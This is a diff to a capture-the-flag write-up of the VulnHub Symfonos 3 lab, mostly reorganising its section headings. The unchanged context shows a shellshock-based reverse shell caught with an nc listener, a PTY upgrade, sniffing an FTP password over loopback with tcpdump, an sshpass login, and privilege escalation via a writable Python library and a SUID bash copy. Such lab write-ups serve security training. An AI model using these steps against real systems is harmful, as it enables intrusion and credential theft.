@@ -19,6 +19,7 @@ layout: default
         <li><a href="#portscan">Port Scanning</a></li>
         <li><a href="#infogather">Information Gathering</a></li>
         <li><a href="#cerberus">Shell - cerberus</a></li>
+        <li><a href="#hades">Shell - hades</a></li>
         <li><a href="#root">Shell - root</a></li>
     </ul>
 
@@ -69,7 +70,7 @@ layout: default
     <li>The web server appears to be vulernable to shellshock.  This will easily get us a reverse shell.</li>
 
     <br>
-    
+
     <h2><a id="cerberus">Shell - cerberus</a></h2>
 
     <li>I set my reverse listener on port 4444 and send a curl against /cgi-bin/underworld with the user agent header set to exploit the shellshock vulnerability.</li>
@@ -82,9 +83,13 @@ layout: default
 &boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/symfonos_3]&#13;&#10;&boxur;&HorizontalLine;$ nc -lvnp 4444&#13;&#10;Ncat: Version 7.91 ( https://nmap.org/ncat )&#13;&#10;Ncat: Listening on :::4444&#13;&#10;Ncat: Listening on 0.0.0.0:4444&#13;&#10;Ncat: Connection from 10.0.0.15.&#13;&#10;Ncat: Connection from 10.0.0.15:34348.&#13;&#10;bash: no job control in this shell&#13;&#10;cerberus@symfonos3:/usr/lib/cgi-bin$ python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;);&quot;         &#13;&#10;&lt;/cgi-bin$ python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;);&quot;                    &#13;&#10;cerberus@symfonos3:/usr/lib/cgi-bin$ export TERM=xterm&#13;&#10;export TERM=xterm&#13;&#10;cerberus@symfonos3:/usr/lib/cgi-bin$ ^Z&#13;&#10;zsh: suspended  nc -lvnp 4444&#13;&#10;                                                                                                                                                                                                                                             &#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/symfonos_3]&#13;&#10;&boxur;&HorizontalLine;$ stty raw -echo;fg;                                                                                                                                                                                                             148 &Cross; 1 &#9881;&#13;&#10;[1]  + continued  nc -lvnp 4444&#13;&#10;&#13;&#10;cerberus@symfonos3:/usr/lib/cgi-bin$ id&#13;&#10;uid=1001(cerberus) gid=1001(cerberus) groups=1001(cerberus),33(www-data),1003(pcap)&#13;&#10;cerberus@symfonos3:/usr/lib/cgi-bin$ 
     </pre>
 
-    <li>The first thing I do is run linpeas.sh.   The first thing that stands out is that we are a part of the pcap group, meaning we can capture packets.  Also we have access to /usr/sbin/tcpdump with admin permissions set.</li>
+    <li>The first thing I do is run linpeas.sh.   The first thing that stands out is that we are a part of the pcap group, meaning we can capture packets.  We have access to /usr/sbin/tcpdump with admin permissions set.</li>
 
     <img src="../images/symfonos_3/tcpdump.png">
+
+    <br>
+
+    <h2><a id="hades">Shell - Hades</a></h2>
 
     <li>I decide to use tcpdump to sniff the local network traffic.</li>
 
@@ -96,7 +101,7 @@ cerberus@symfonos3:/tmp$ tcpdump -i lo&#13;&#10;tcpdump: verbose output suppress
 
     <li>We are able to sniff the credentials for the user hades from their login to the ftp server.  The password is PTpZTfU4vxgzvRBE</li>
 
-    <h2>Privesc - Hades</h2>
+    <br>
 
     <li>We login to the Hades users using the ssh</li>
 
@@ -104,7 +109,9 @@ cerberus@symfonos3:/tmp$ tcpdump -i lo&#13;&#10;tcpdump: verbose output suppress
 &boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/symfonos_3]&#13;&#10;&boxur;&HorizontalLine;$ sshpass -p PTpZTfU4vxgzvRBE ssh hades@10.0.0.15                                                            130 &Cross;&#13;&#10;Linux symfonos3 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64&#13;&#10;&#13;&#10;The programs included with the Debian GNU/Linux system are free software;&#13;&#10;the exact distribution terms for each program are described in the&#13;&#10;individual files in /usr/share/doc/*/copyright.&#13;&#10;&#13;&#10;Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent&#13;&#10;permitted by applicable law.&#13;&#10;No mail.&#13;&#10;Last login: Mon Apr  6 14:06:02 2020 from 192.168.50.128&#13;&#10;hades@symfonos3:~$ 
     </pre>
 
-    <li>I run linpeas again as Hades and I find that I am part of the "GODS" group which gives me write access to  files inside the python2.7 lib directory - /usr/lib/python2.7/</li>
+    <h2><a id="root">Shell - Root</a></h2>
+
+    <li>I run linpeas again as Hades and I find that I am part of the "gods" group which gives me write access to  files inside the python2.7 lib directory - /usr/lib/python2.7/</li>
     <pre>
 &boxDR;&boxH;&boxH;&boxH;&boxH;&boxH;&boxH;&boxH;&boxH;&boxH;&boxH;&boxVL; Interesting GROUP writable files (not in Home) (max 500)&#13;&#10;&boxUR; https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files&#13;&#10;  Group hades:&#13;&#10;&#13;&#10;  Group gods:&#13;&#10;/usr/lib/python2.7&#13;&#10;/usr/lib/python2.7/numbers.py&#13;&#10;/usr/lib/python2.7/mailbox.py&#13;&#10;/usr/lib/python2.7/plistlib.pyc&#13;&#10;/usr/lib/python2.7/pydoc.pyc&#13;&#10;/usr/lib/python2.7/SimpleHTTPServer.py&#13;&#10;#)You_can_write_even_more_files_inside_last_directory&#13;&#10;&#13;&#10;/etc/python2.7/sitecustomize.py
     </pre>
@@ -144,8 +151,6 @@ hades@symfonos3:/tmp$ ls -la&#13;&#10;total 4612&#13;&#10;drwxrwxrwt  9 root    
 <mark>-rwsr-sr-x  1 root     root      975488 Sep 23 10:52 rootbash</mark>
 drwx------  3 root     root        4096 Sep 22 11:23 systemd-private-b3950a3936fe498d87e4f6a8bb5c726d-apache2.service-TvRruh&#13;&#10;drwx------  3 root     root        4096 Sep 22 11:23 systemd-private-b3950a3936fe498d87e4f6a8bb5c726d-systemd-timesyncd.service-AM0Iif&#13;&#10;drwxrwxrwt  2 root     root        4096 Sep 22 11:23 .X11-unix&#13;&#10;drwxrwxrwt  2 root     root        4096 Sep 22 11:23 .XIM-unix
     </pre>
-
-    <h2><a id="root">Shell - Root</a></h2>
 
     <li>Now we execute the rootbash file with the -p flag and we gain a root shell.</li>
 
